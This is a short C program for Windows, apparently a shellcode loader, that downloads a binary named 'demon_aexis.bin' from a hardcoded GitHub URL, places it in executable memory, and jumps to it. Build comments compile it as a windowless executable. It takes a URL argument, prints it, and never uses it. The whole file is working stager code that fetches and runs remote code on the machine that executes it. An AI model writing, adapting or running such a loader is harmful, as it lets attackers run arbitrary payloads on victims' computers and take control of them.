#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#pragma comment(lib, "wininet.lib")

//gcc main.c -o payloadloader.exe -lwininet -mwindows
//Start-Process ./payloadloader.exe

void download(char **buffer, DWORD *size) {
    HINTERNET hInternet = InternetOpenA("Mozilla", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hConnect = InternetOpenUrlA(hInternet, "https://github.com/monba08/DemoProject/blob/master/demon_aexis.bin", NULL, 0, INTERNET_FLAG_RELOAD, 0);

    if (hConnect == NULL) {
        DWORD err = GetLastError();
        printf("InternetOpenUrlA failed, error code: %lu\n", err);
    } else {
        printf("InternetOpenUrlA succeeded!\n");
    }

    BYTE tempBuffer[4096];
    DWORD bytesRead;
    *size = 0;
    *buffer = NULL;

    while (InternetReadFile(hConnect, tempBuffer, sizeof(tempBuffer), &bytesRead) && bytesRead > 0) {
        *buffer = (char *)realloc(*buffer, *size + bytesRead);
        memcpy(*buffer + *size, tempBuffer, bytesRead);
        *size += bytesRead;
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

int main(int argc, char **argv) {
    printf("Rrrrrrrr");
    if(argc < 2){
        printf("missing url\n");
        return 1;
    }
    char *url = argv[1];

    printf("%s", url);

    char *shellcode = NULL;
    DWORD size = 0;

    download(&shellcode, &size);

    void *exec = VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, size);
    ((void(*)())exec)();  // Jump to shellcode

    return 0;
}